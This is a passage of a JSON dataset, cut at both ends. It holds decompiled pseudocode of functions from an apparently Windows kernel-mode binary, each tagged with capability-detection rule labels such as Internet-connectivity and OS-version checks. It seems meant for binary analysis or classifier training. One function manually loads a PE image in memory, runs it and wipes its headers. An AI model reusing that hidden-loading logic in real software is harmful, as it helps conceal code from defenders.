0xffffff00;\n    }\n    return uVar4;\n}\n",
        "token_count": 1270
    },
    "0001ce40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0001ce40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.0001b770(0xb1c5b0a0, 1, 0);\n    if (iVar1 == 1) {\n        var_8h = 0;\n    }\n    else {\n        iVar1 = fcn.00016190(0xb1bde774, 0xb1c59b70);\n        if ((iVar1 == 0) || (var_8h = fcn.00016190(0xb1bde790, 0xb1c59b70),  var_8h == 0)) {\n            *0xb1c5b0a4 = *(*0xb1c59b70 + 8);\n            uVar3 = 0;\n            uVar2 = 0xb1bde7aa;\n            var_8h = fcn.00075560(0xb1bde7aa);\n            if ((var_8h == 0) && (var_8h = fcn.0001e5f0(uVar2, uVar3),  var_8h == 0)) {\n                if (arg_8h == '\\0') {\n                    fcn.00078622(0xb1be9f80, 0);\n                }\n                else {\n                    fcn.00015a50(0);\n                }\n            }\n            if (var_8h != 0) {\n                fcn.0001ea20();\n                fcn.00075750();\n                (**0xb1bde2e4)();\n            }\n        }\n        else {\n            fcn.00036f40(0xb1c5b0a0, 0);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 444
    },
    "0001cf20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001cf20(void)\n\n{\n    if (*0xb1c5b0a0 != 0) {\n        fcn.00078622(0xb1be9f80, 1);\n        fcn.0001ea20();\n        fcn.00075750();\n        (**0xb1bde2e4)();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0001d010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001d010(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0xb1c5b0a8 == 0) {\n        (**0xb1bde11c)(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        iVar2 = *0xb1c5b0a8;\n        pcVar1 = fcn.000639f0(*0xb1c5b0a8);\n        (*pcVar1)(iVar2, arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0001d050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001d050(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0xb1c5b0ac == 0) {\n        (**0xb1bde0b0)(arg_8h, arg_ch);\n    }\n    else {\n        iVar2 = *0xb1c5b0ac;\n        pcVar1 = fcn.000639f0(*0xb1c5b0ac);\n        (*pcVar1)(iVar2, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "0001d090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0001d090(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0xb1c5b0b0 == 0) {\n        uVar2 = fcn.00078628(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        iVar4 = *0xb1c5b0b0;\n        pcVar3 = fcn.000639f0(*0xb1c5b0b0);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        fcn.0001b6f0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 291
    },
    "0001d110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d110(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint32_t extraout_ECX;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0xb1c5b0b4 == 0) {\n        uVar2 = fcn.0007853e(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        iVar4 = *0xb1c5b0b4;\n        pcVar3 = fcn.000639f0(*0xb1c5b0b4);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n        fcn.0001b6f0(extraout_ECX & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 282
    },
    "0001d190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0001d190(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0xb1c5b0b8 == 0) {\n        uVar2 = fcn.000785fe(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        iVar4 = *0xb1c5b0b8;\n        pcVar3 = fcn.000639f0(*0xb1c5b0b8);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h);\n        fcn.0001b6f0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 243
    },
    "0001d200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d200(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    uint var_5h;\n    \n    if (*0xb1c5b0bc == 0) {\n        uVar2 = fcn.0007862e(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        iVar5 = *0xb1c5b0bc;\n        pcVar3 = fcn.000639f0(*0xb1c5b0bc);\n        uVar4 = (*pcVar3)(iVar5, arg_8h, arg_ch);\n        uVar2 = uVar4;\n        fcn.0001b6f0(uVar4 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 225
    },
    "0001d260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.0001d260(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00061630(param_1);\n    if (iVar1 == 0) {\n        fcn.00061690(0xb1bde7bc, 0xb1c5b0a8);\n        fcn.00061690(0xb1bde7d4, 0xb1c5b0ac);\n        fcn.000616d0(0xb1bde6e8, 0xb1c5b0b0);\n        fcn.000616d0(0xb1bde7e8, 0xb1c5b0b4);\n        fcn.000616d0(0xb1bde7f8, 0xb1c5b0b8);\n        fcn.000616d0(0xb1bde808, 0xb1c5b0bc);\n        fcn.00061670();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 264
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl entry0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    **0xb1c59660 = 0xffffffff;\n    (*0xb1c59660)[1] = *(arg_8h + 0xc);\n    (*0xb1c59660)[2] = *(arg_8h + 0x10);\n    var_8h = fcn.000348f0(0xb1bde81c, *0xb1c59660 + 3, *0xb1c59660 + 4);\n    if (var_8h == 0) {\n        *0xb1c5b0c0 = (*0xb1c59660)[1];\n        *0xb1c5b0c4 = *0xb1c5b0c0 + -1 + (*0xb1c59660)[2];\n        if ((*0xb1c5b0c0 == 0) || (*0xb1c5b0c0 == *0xb1c5b0c4)) {\n            var_8h = -0x3fffffd0;\n        }\n        else {\n            iVar1 = fcn.00034b10(0xb1c5b0c8, 0x104);\n            var_1h._0_1_ = 1 - (iVar1 != 0);\n            var_8h = fcn.0001d740(arg_8h, arg_ch, var_1h);\n            if ((((var_8h == 0) && (var_8h = fcn.00015ca0(arg_8h, extraout_ECX & 0xffffff00 | var_1h),  var_8h == 0)) &&\n                (var_1h != 0)) && (iVar1 = fcn.0001a8e0(&var_10h, 0xb1be9e40, var_1h),  iVar1 == 0)) {\n                fcn.00037220(&var_10h);\n            }\n            if ((var_8h != 0) && (var_8h != -0x3ffffee0)) {\n                fcn.0001d420(arg_8h);\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 568
    },
    "0001d460": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0001d460(void)\n\n{\n    int32_t iVar1;\n    uint var_240h;\n    int32_t var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint *var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_210h;\n    uint var_4h;\n    \n    var_220h._0_2_ = 0x70;\n    var_220h._2_2_ = 0x72;\n    var_21ch = 0xb1bde830;\n    var_238h = 0x18;\n    var_234h = 0;\n    var_22ch = 0x40;\n    var_230h = &var_220h;\n    var_228h = 0;\n    var_224h = 0;\n    iVar1 = fcn.00078634(&var_240h, 0x1f0003, &var_238h);\n    if (iVar1 == 0) {\n        fcn.00078544(var_240h);\n        var_23ch = 0x40000000;\n    }\n    else {\n        fcn.0002bbb0(&var_210h, 0x104);\n        fcn.00078550(&var_218h, &var_210h);\n        var_238h = 0x18;\n        var_234h = 0;\n        var_22ch = 0x40;\n        var_230h = &var_218h;\n        var_228h = 0;\n        var_224h = 0;\n        iVar1 = fcn.00078634(&var_240h, 0x1f0003, &var_238h);\n        if (iVar1 == 0) {\n            fcn.00078544(var_240h);\n            var_23ch = 0x40000000;\n        }\n        else {\n            var_23ch = fcn.00036da0(&var_4h);\n            if (var_23ch == 0) {\n                var_238h = 0x18;\n                var_234h = 0;\n                var_22ch = 0x240;\n                var_230h = &var_218h;\n                var_228h = var_4h;\n                var_224h = 0;\n                var_23ch = fcn.0007863a(*0xb1c59660 + 0x1c, 0x1f0003, &var_238h, 0, 0);\n                fcn.00036f20(var_4h);\n            }\n        }\n    }\n    return var_23ch;\n}\n",
        "token_count": 640
    },
    "0001d620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001d620(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h == -1) {\n        var_10h = 0;\n    }\n    else {\n        arg_8h_00 = fcn.00035230(*(*0xb1c59660 + 8));\n        if (arg_8h_00 == 0) {\n            var_10h = -0x3fffff66;\n        }\n        else {\n            fcn.0007877e(arg_8h_00, *0xb1c5b0c0, *(*0xb1c59660 + 8));\n            iVar2 = *0xb1c5b0c0 + *(*0xb1c5b0c0 + 0x3c);\n            var_10h = fcn.0005b270(arg_8h_00, (arg_8h_00 - *0xb1c5b0c0) + *(iVar2 + 0x34));\n            if (var_10h == 0) {\n                pcVar1 = arg_8h_00 + *(iVar2 + 0x28);\n                if (pcVar1 == NULL) {\n                    var_10h = -0x3fffffff;\n                }\n                else {\n                    arg_8h[3] = arg_8h_00;\n                    var_10h = (*pcVar1)(arg_8h, arg_ch);\n                    if (var_10h == 0) {\n                        for (var_14h = 0; var_14h < *(arg_8h_00 + 0x54 + *(arg_8h_00 + 0x3c)) >> 2;\n                            var_14h = var_14h + 1) {\n                            *(arg_8h_00 + var_14h * 4) = 0;\n                        }\n                        var_10h = -0x3ffffee0;\n                    }\n                }\n            }\n        }\n        if (var_10h != -0x3ffffee0) {\n            fcn.00035330(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 550
    },
    "0001d740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001d740(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0xb1c464b7 == '\\0') {\n        iVar1 = 0;\n    }\n    else {\n        *0xb1c464b7 = '\\0';\n        iVar1 = fcn.00066c80();\n        if ((iVar1 == 0) && ((arg_10h == 0 || (iVar1 = fcn.0001d460(),  iVar1 == 0)))) {\n            iVar1 = fcn.00036980(*0xb1c59660 + 0x14);\n            if (iVar1 == 0) {\n                iVar1 = -1;\n            }\n            else {\n                iVar1 = fcn.0001d620(arg_8h, arg_ch);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 214
    },
    "0001d7c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d7c0(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.00035330(*arg_8h);\n        *arg_8h = 0;\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.00035200(arg_10h);\n        if (iVar2 == 0) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            if (arg_10h < arg_ch) {\n                var_8h = arg_10h;\n            }\n            else {\n                var_8h = arg_ch;\n            }\n            fcn.0007877e(iVar2, *arg_8h, var_8h);\n            fcn.00035330(*arg_8h);\n            *arg_8h = iVar2;\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 258
    },
    "0001d850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001d850(void)\n\n{\n    char cVar1;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0xb1bde8a4;\n    var_4h = 0;\n    fcn.0002bf40(&var_68h, 0x52);\n    var_6ch = &var_68h;\n    do {\n        cVar1 = *var_6ch;\n        var_6ch = var_6ch + 1;\n    } while (cVar1 != '\\0');\n    var_ch = fcn.00076d00(0xb1c5b2d0, &var_8h, &var_68h, var_6ch + (1 - (&var_68h + 1)), 1);\n    if (var_ch == 0) {\n        var_ch = fcn.00077430(*0xb1c5b2d0, 0xb1bea900, 0, 0);\n    }\n    return var_ch;\n}\n",
        "token_count": 273
    },
    "0001d900": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d900(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        var_ch = NULL;\n    }\n    else {\n        var_ch = fcn.0002f1f0(arg_10h, arg_14h);\n        if (var_ch == NULL) {\n            return 0xffffffff;\n        }\n    }\n    var_10h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = fcn.0002afa0(arg_8h, arg_ch, var_ch, &var_10h, &var_4h, &var_8h, 0);\n    iVar2 = fcn.00077b90(arg_8h, &var_10h, 4, 0);\n    if (iVar2 == 0) {\n        if (0 < var_8h) {\n            iVar2 = fcn.00077b10(arg_8h, var_8h, 0);\n            *arg_18h = iVar2;\n            if (*arg_18h == 0) {\n                var_14h = 0x21590004;\n            }\n            else {\n                fcn.0007877e(*arg_18h, var_4h, var_8h);\n                *arg_1ch = var_8h;\n            }\n        }\n    }\n    else {\n        var_14h = 0xffffffff;\n        fcn.00077b30(arg_8h, *arg_18h, 0);\n        *arg_18h = 0;\n        *arg_1ch = 0;\n    }\n    fcn.00035330(var_4h);\n    while (var_ch != NULL) {\n        puVar1 = *var_ch;\n        if (var_ch[4] != var_ch + 5) {\n            fcn.00035330(var_ch[4]);\n        }\n        fcn.00035330(var_ch);\n        var_ch = puVar1;\n    }\n    return var_14h;\n}\n",
        "token_count": 549
    },
    "0001db30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001db30(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_65h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    iVar1 = fcn.000205e0(arg_10h, 0x17, 4, &var_74h, 0);\n    if (iVar1 == 0) {\n        var_6ch = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020650(arg_10h, 0x19, 1, &var_65h, 1);\n        if (iVar1 == 0) {\n            var_65h._0_1_ = 0;\n        }\n        iVar1 = fcn.000205e0(arg_10h, 0x18, 4, &var_28h, 0);\n        if (iVar1 == 0) {\n            var_28h = 0;\n        }\n        iVar1 = fcn.00020650(arg_10h, 0x23, 8, &var_70h, 4);\n        if (iVar1 == 0) {\n            var_70h = 0;\n        }\n        iVar1 = fcn.00020650(arg_10h, 0x24, 2, &var_65h + 1, 4);\n        if (iVar1 == 0) {\n            stack0xffffff98 = 0;\n        }\n        var_10h = 0;\n        var_ch = NULL;\n        var_8h = 0;\n        var_4h = 0;\n        var_6ch = fcn.00018b30(var_74h, var_28h, &stack0xffffff00 | var_65h, -(var_70h != 0) & &var_70h, &var_14h);\n        if (var_6ch == 0) {\n            iVar1 = fcn.00017cf0(var_14h, -(var_70h != 0) & &var_70h);\n            var_20h = iVar1 + 1;\n            var_10h = 7;\n            var_ch = &var_60h;\n            fcn.00078790(&var_60h);\n            var_60h = 0x1f;\n            var_5ch = 4;\n            var_58h = 0x32;\n            var_54h = 4;\n            var_50h = 0x1b;\n            var_4ch = 2;\n            var_48h = 0x33;\n            var_44h = 8;\n            var_40h = 0x34;\n            var_3ch = 8;\n            var_38h = 0x35;\n            var_34h = 8;\n            var_30h = 0x36;\n            var_2ch = 8;\n            var_4h = fcn.000352f0(var_20h, 4);\n            if (var_4h == 0) {\n                var_6ch = 0x21590004;\n            }\n            else {\n                fcn.00078790(var_4h);\n                var_18h = 0;\n                fcn.00018120(var_14h, var_4h, -(var_70h != 0) & &var_70h, stack0xffffff98, \n                             -(stack0xffffff98 != 0) & &var_18h);\n                for (var_1ch = 0; (*(var_4h + var_1ch * 4) != 0 && (var_1ch < var_20h)); var_1ch = var_1ch + 1) {\n                }\n                var_8h = var_1ch;\n                var_6ch = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n            }\n        }\n        if (var_14h != 0) {\n            for (var_24h = 0; *(var_14h + var_24h * 4) != 0; var_24h = var_24h + 1) {\n                fcn.00018e50(*(var_14h + var_24h * 4));\n            }\n            fcn.00035330(var_14h);\n        }\n        if (var_4h != 0) {\n            for (var_24h = 0; var_24h < var_8h; var_24h = var_24h + 1) {\n                if (*(var_4h + var_24h * 4) != 0) {\n                    fcn.00035330(*(var_4h + var_24h * 4));\n                }\n            }\n            fcn.00035330(var_4h);\n        }\n    }\n    return var_6ch;\n}\n",
        "token_count": 1331
    },
    "0001de60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001de60(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_44h;\n    char *var_40h;\n    char *var_3ch;\n    uint var_38h;\n    uint var_30h;\n    char *var_2ch;\n    char *var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0xb1bde8a8;\n    var_14h = 0xb1bde8b0;\n    var_10h = 0xb1bde8b8;\n    var_ch = 0xb1bde8c4;\n    *0xb1c5b2e4 = fcn.00029470(6, 2);\n    for (var_8h = 0; var_8h < *0xb1c5b2dc; var_8h = var_8h + 1) {\n        fcn.00035330(*(*0xb1c5b2e0 + var_8h * 4));\n    }\n    fcn.00035330(*0xb1c5b2e0);\n    *0xb1c5b2e0 = fcn.00035200(0x10);\n    if (*0xb1c5b2e0 != 0) {\n        for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n            var_2ch = (&var_18h)[var_8h];\n            pcVar3 = var_2ch + 1;\n            do {\n                cVar1 = *var_2ch;\n                var_2ch = var_2ch + 1;\n            } while (cVar1 != '\\0');\n            uVar4 = fcn.00035200(var_2ch + (1 - pcVar3));\n            *(*0xb1c5b2e0 + var_8h * 4) = uVar4;\n            if (*(*0xb1c5b2e0 + var_8h * 4) == 0) {\n                *0xb1c5b2dc = var_8h;\n                return;\n            }\n            var_3ch = (&var_18h)[var_8h];\n            var_40h = *(*0xb1c5b2e0 + var_8h * 4);\n            do {\n                cVar1 = *var_3ch;\n                *var_40h = cVar1;\n                var_3ch = var_3ch + 1;\n                var_40h = var_40h + 1;\n            } while (cVar1 != '\\0');\n        }\n        *0xb1c5b2dc = var_8h;\n        iVar5 = fcn.00029090(7, 0, 0, &var_20h);\n        if (((iVar5 == 0) && (var_20h != NULL)) && (pcVar3 = fcn.00035200(var_20h),  pcVar3 != NULL)) {\n            var_4h = 0;\n            var_1ch = pcVar3;\n            for (var_28h = pcVar3; *var_28h != '\\0'; var_28h = var_28h + 1) {\n                if ((*var_28h == ';') && (1 < var_28h - var_1ch)) {\n                    var_1ch = var_28h + 1;\n                    var_4h = var_4h + 1;\n                }\n            }\n            iVar5 = fcn.0001d7c0(0xb1c5b2e0, 8, var_4h * 4 + 8);\n            var_28h = pcVar3;\n            pcVar2 = pcVar3;\n            if (iVar5 == -1) {\n                fcn.00035330(pcVar3);\n            }\n            else {\n                for (; var_1ch = pcVar2,  *var_28h != '\\0'; var_28h = var_28h + 1) {\n                    if ((*var_28h == ';') && (1 < var_28h - var_1ch)) {\n                        *var_28h = '\\0';\n                        var_20h = var_28h + (1 - var_1ch);\n                        uVar4 = fcn.00035200(var_20h);\n                        *(*0xb1c5b2e0 + *0xb1c5b2dc * 4) = uVar4;\n                        if (*(*0xb1c5b2e0 + *0xb1c5b2dc * 4) != 0) {\n                            fcn.0007877e(*(*0xb1c5b2e0 + *0xb1c5b2dc * 4), var_1ch, var_20h);\n                            fcn.00078640(*(*0xb1c5b2e0 + *0xb1c5b2dc * 4));\n                            *0xb1c5b2dc = *0xb1c5b2dc + 1;\n                        }\n                        var_1ch = var_28h + 1;\n                    }\n                    pcVar2 = var_1ch;\n                }\n                fcn.00035330(pcVar3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1281
    },
    "0001e160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001e160(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.0001de60();\n    iVar1 = fcn.00020650(arg_10h, 2, 2, &var_ch, 4);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00020650(arg_10h, 0x4a, 3, &var_4h, 4);\n        if (iVar1 == 0) {\n            var_4h = fcn.00029470(6, 2);\n        }\n        if (var_4h == 0) {\n            if (*0xb1c5b2d4 == 0) {\n                return 0;\n            }\n            for (var_8h = 0; (var_8h < *0xb1c5b2d4 && (*(*0xb1c5b2d8 + var_8h * 8) != var_ch)); var_8h = var_8h + 1) {\n            }\n            for (; var_8h < *0xb1c5b2d4 - 1; var_8h = var_8h + 1) {\n                fcn.00078586(*0xb1c5b2d8 + var_8h * 8, *0xb1c5b2d8 + 8 + var_8h * 8, 8);\n            }\n            if (var_8h < *0xb1c5b2d4) {\n                *0xb1c5b2d4 = *0xb1c5b2d4 - 1;\n                fcn.0001d7c0(0xb1c5b2d8, *0xb1c5b2d4 * 8 + 8, *0xb1c5b2d4 * 8);\n            }\n        }\n        else {\n            for (var_8h = 0; var_8h < *0xb1c5b2d4; var_8h = var_8h + 1) {\n                if (*(*0xb1c5b2d8 + var_8h * 8) == var_ch) {\n                    *(*0xb1c5b2d8 + 4 + var_8h * 8) = var_4h;\n                    return 0;\n                }\n            }\n            iVar1 = fcn.0001d7c0(0xb1c5b2d8, *0xb1c5b2d4 << 3, *0xb1c5b2d4 * 8 + 8);\n            if (iVar1 == -1) {\n                return 0x21590004;\n            }\n            *(*0xb1c5b2d8 + *0xb1c5b2d4 * 8) = var_ch;\n            *(*0xb1c5b2d8 + 4 + 